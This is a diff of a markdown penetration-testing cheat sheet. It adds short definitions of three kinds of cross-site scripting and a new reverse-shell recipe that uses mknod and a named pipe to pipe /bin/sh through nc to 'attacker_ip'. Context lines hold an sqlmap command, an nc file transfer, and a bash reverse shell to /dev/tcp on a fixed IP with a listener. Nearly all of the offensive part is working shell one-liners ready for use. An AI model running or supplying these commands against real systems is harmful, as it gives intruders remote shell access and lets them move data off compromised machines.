@@ -219,6 +219,14 @@ in google chrome, open network, select call and and copy request header, paste i
 sqlmap -r req.txt 
 ```
 
+## Web application
+
+### Cross-Site Scripting (XSS)
+
+* _Stored XSS attacks /_ _Persistent XSS:_ exploit stored server --> attack all users of the site.&#x20;
+* _Reflected XSS attacks_: the payload in a crafted request or link --> attacks the person submitting the request or viewing the link
+* _DOM-based XSS attacks:_ similar to the other two, solely within the page's DOM
+
 ## Networking
 
 ### **Tunneling**
@@ -278,6 +286,9 @@ nc -w 3 [destination] 1234 < out.file
 ```bash
 bash -i >& /dev/tcp/10.9.6.147/4242 0>&1
 nc -lvnp 4242
+
+mknod /tmp/backpipe p
+/bin/sh 0</tmp/backpipe | nc attacker_ip 4242 1>/tmp/backpipe
 ```
 
 ### Socat Reverse Shells
